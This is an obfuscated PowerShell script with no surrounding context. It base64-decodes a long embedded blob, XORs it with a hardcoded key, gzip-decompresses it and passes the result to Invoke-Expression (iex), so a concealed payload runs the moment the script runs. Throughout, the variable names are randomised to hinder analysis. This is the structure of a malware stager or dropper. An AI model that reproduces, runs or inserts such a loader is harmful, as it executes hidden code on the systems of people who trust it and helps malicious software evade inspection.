$8cyebpu91lnmk3f = [System.Text.Encoding]::ascii
function k4taej8om6gzlpwu5siv1xqyd3h  {param($b4tsfzuij3e7mpg )
  $lbfj65dm1qi0pso = [System.Convert]::FromBase64String($b4tsfzuij3e7mpg)
  $nyceu5o3iq0plbg= $8cyebpu91lnmk3f.GetBytes("td1xkca3g8fq")
    $s6w4ukg2o07etj1 = $lbfj65dm1qi0pso
    $40oc58lhgmu1k96 = $(for ($6wb9cqeva1rnj2p = 0; $6wb9cqeva1rnj2p -lt $s6w4ukg2o07etj1.length; ) {
        for ($dtcih5y12wx068r = 0; $dtcih5y12wx068r -lt $nyceu5o3iq0plbg.length; $dtcih5y12wx068r++) {
            $s6w4ukg2o07etj1[$6wb9cqeva1rnj2p] -bxor $nyceu5o3iq0plbg[$dtcih5y12wx068r]
            $6wb9cqeva1rnj2p++
            if ($6wb9cqeva1rnj2p -ge $s6w4ukg2o07etj1.Length) {
                $dtcih5y12wx068r = $nyceu5o3iq0plbg.length
            }
        }
    })
	$zou09657qhb32cv = New-Object System.IO.MemoryStream( , $40oc58lhgmu1k96 )

	    $2y60igqtsdnz35o = New-Object System.IO.MemoryStream
        $fmktqe61onjwxiu = New-Object System.IO.Compression.GzipStream $zou09657qhb32cv, ([IO.Compression.CompressionMode]::Decompress)
	    $fmktqe61onjwxiu.CopyTo( $2y60igqtsdnz35o )
        $fmktqe61onjwxiu.Close()
		$zou09657qhb32cv.Close()
		[byte[]] $9y63ljshp40to5i = $2y60igqtsdnz35o.ToArray()
 $c14d6z3wxlmsnat=$9y63ljshp40to5i
    return $c14d6z3wxlmsnat
}
[byte[]]$emhb7sx3ioyz1wq=k4taej8om6gzlpwu5siv1xqyd3h $dyormqizf546nuk
[System.Text.Encoding]::ascii.GetString((k4taej8om6gzlpwu5siv1xqyd3h "a+85eGtjYTNjOOskGQuSQHudHXubP6273YCDWPnFiF3MRi7DwKlvq4AoFYgQ4QyU9Gd/uTu45VccwYlGyMB8sRVLKbOg2wHvDQJdDCbkGq0Vb9fpV42AgefGP7m3i8hQzHYTMA9Xo+ob6V2D1pIiy3h6HnPqsMxRgv6ULyhxXj4buqihgBocbebPaG5O84cfmFXfR/f/cdpVXjshQTwaUmZ/U1yJP1U/BVeW6MjTWAFNZAKjU+CohIPO4hYJbgL7JFEbl2Iazjc/tMuuRIJ6Un8b/bhfInY4D7n73eW9zSG7VF9HEEva3uQdRoXokTzFq/vAZh9mqXeNP8J6NGlSZmDzwaSqBt8+AC3r+kRZaP+/nw6+HuJb9+Z2M93M2HJEpepVXcHEPSV7lb3sGAHGRuFp1F1Kaa0bysTkxTHOVsvY6gMrk5+xtLJp6V+mnxOh835RFRbIlEXZUPBMORiL16I28PZ520S5ykyEnLTNuI9pk6k8pdkenvYJ34RMjy3bCrxMcsExoGwnTQvSy7meW0V2aHA6Q0hWAosjPrx540MIRgBRB3UC9megPy69rmO+OynlOm3RNu4RBlibG6OMGhdvgsx3KFOedEW/6FLvMp03g+Wxil9L5tFicDzqJ/1XXjBZtHjBY0fhI/JeOyyjAC/yjlYblA2g16ORhu6wDrbYI1S7YUMgRVCr42vNu7DwMTPFOLxn7NFCDX9Z/G6J8VjdmM3gra4HxVBVcol3OehvFQqMEG3/31hiav57KXA2tYhp1mU63c2+9vjbAtQXCc5cMYzgJIchJCQ34VwabwtouPeIQ21iwuzirV5aadjGB8k6vTbMKzzZsYHo5xFz6SLHxeJLZEUtAaDZV1Phw3c3Ecf5ol060UcFkZrJdQ3Ci9ZVdmWzWf0tMYTbPZiocYHJOZ/qqoB2IE2w42vjF5ZMJWwSWhdUVB5cjdc9W5YI2WcfQ+2ZsfPIB2WNEVzTm90O7lz693Hymp1IBw88BN2inZm+w4Wcm7VPf/Qa59gDmgrcqfafF9oAR1x6k74ooIgdh0XIP8V6iB6vkzFxBmevuOBQllACPyuIJ/dupKyaGWEBthKjaqqw+GoQE/EBeS8+GzriRU9/ustcX4cH82zdDoS6jPWrJ0hVz01Lgd7Y1sYxzQt/I7K3b6B+T1ux+2DZNiLgunR0cYg6R+Zjl7kmB5tbIN3Q8qaqqy4eYvyPc9LrFdg8ZjNn"))|iex;